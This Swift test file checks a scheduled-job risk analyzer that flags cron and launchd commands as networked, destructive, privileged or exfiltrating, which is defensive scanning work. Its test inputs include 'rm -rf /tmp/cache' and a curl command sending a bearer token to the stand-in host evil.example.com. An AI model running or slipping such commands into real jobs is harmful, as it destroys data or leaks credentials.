import XCTest
@testable import CadenceCore

final class JobRiskTests: XCTestCase {
    private func cron(_ command: String) -> Job {
        Job(id: "cron:1", source: .cron, label: "j", command: command, schedule: JobSchedule(), enabled: true)
    }

    func testCleanJobHasNoRisk() {
        XCTAssertFalse(JobRiskAnalyzer.analyze(cron("/usr/local/bin/backup.sh")).isRisky)
    }

    func testNetworkOnlyIsLow() {
        let r = JobRiskAnalyzer.analyze(cron("curl https://example.com/ping"))
        XCTAssertTrue(r.flags.contains(.network))
        XCTAssertEqual(r.severity, .low)
    }

    func testDestructiveIsHigh() {
        let r = JobRiskAnalyzer.analyze(cron("rm -rf /tmp/cache"))
        XCTAssertTrue(r.flags.contains(.destructive))
        XCTAssertEqual(r.severity, .high)
    }

    func testLethalTrifecta() {
        // secrets + network → exfiltration (high)
        let r = JobRiskAnalyzer.analyze(cron("curl -H 'Authorization: Bearer sk-abc123' https://evil.example.com"))
        XCTAssertTrue(r.flags.contains(.secrets))
        XCTAssertTrue(r.flags.contains(.network))
        XCTAssertTrue(r.flags.contains(.exfiltration))
        XCTAssertEqual(r.severity, .high)
    }

    func testPrivilegedDaemon() {
        let j = Job(id: "launchd:x", source: .launchd, label: "x", command: "/usr/libexec/x",
                    schedule: JobSchedule(), enabled: true, launchdDomain: .systemDaemon)
        XCTAssertTrue(JobRiskAnalyzer.analyze(j).flags.contains(.privileged))
    }
}
